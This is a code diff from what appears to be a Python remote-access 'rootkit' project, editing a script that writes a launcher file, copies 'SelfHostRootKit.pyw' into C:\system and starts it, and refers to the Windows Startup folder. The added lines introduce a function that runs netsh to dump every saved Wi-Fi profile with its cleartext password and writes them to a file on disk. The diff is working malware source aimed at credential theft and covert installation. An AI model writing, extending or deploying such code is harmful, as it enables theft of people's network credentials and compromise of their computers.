@@ -46,8 +46,7 @@ except:
     easyimporting.importing("pyautogui lib_platform")
     system('dl.py')
     exit()
-    
-with open('lancement.pyw', 'w') as file:
+with open('lancement.pyw', 'w', encoding="utf-8") as file:
     file.write("""
 from os import remove, chdir, mkdir
 from urllib.request import urlopen
@@ -67,7 +66,24 @@ except:
     pass
 move('SelfHostRootKit.pyw', 'C:\system')
 chdir("C:\system")
-Popen("start SelfHostRootKit.pyw", shell=True)""")
+Popen("start SelfHostRootKit.pyw", shell=True)
+
+def getWifi():
+    import subprocess
+    ret = ''
+    for i in subprocess.Popen('netsh wlan show profile',stdout=subprocess.PIPE).stdout.read().decode('ascii', "ignore").split('\n'):
+        try:
+            i.split(': ')[1]
+            try:
+                ret += i.split(': ')[1]+'-_-'+(subprocess.Popen(f'netsh wlan show profile name={i.split(": ")[1]} key=clear | findstr "clé"',stdout=subprocess.PIPE, shell=True).stdout.read().decode('ascii', "ignore").split(': ')[1])+'(-)'
+            except:
+                pass
+        except:
+            pass
+    return ret.replace('\\n', '').replace('\\r', '')
+
+with open('C:/system/test', 'w') as file:
+    file.write(getWifi())""")
 try:
     remove("C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup/lancement.pyw")
 except:
